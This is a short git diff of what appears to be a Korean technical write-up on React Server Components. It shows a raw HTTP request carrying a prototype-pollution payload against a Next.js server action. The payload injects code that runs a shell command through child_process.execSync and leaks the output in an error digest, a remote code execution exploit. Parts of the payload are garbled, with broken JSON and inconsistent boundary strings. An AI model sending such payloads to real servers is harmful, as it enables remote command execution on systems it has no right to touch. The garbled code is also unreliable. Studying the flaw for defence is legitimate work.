@@ -63,17 +63,24 @@ React는 컴포넌트를 처리하기 위해 문자열, 배열 외에도 **Promi
 ```jsx
 POST / HTTP/1.1
 Host: localhost: 3000
+
 [... 기타 헤더 생략 ...]
+
 Next-Action: x
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
 ------WebKitFormBoundary7MA4YWxkTrZu0gW
+
 Content-Disposition: form-data; name="0"
 {"then": "$1: __proto__: then", "status": "resolved_model" , "reason": -1, "value": "{\"then\": \"$B0\"}" , "_response":
 f"_prefix": "var res = process mainModule.require('child_process'). execSync('실행할 명령어',
 {'timeout': 5000}). toString(). trim(); throw Object.assign(new Error( 'NEXT_REDIRECT'), {digest: ${res} });" {"get":"$1: constructor: constructor"}}}
+
 ------WebkitFormBoundary7MA4YWxkTrZu0gW
+
 Content-Disposition: form-data; name="1"
 "$@0"
+
 ------WebKitFormBoundary7MA4YWxkTrZu0gW--
 '_formData":
 ```
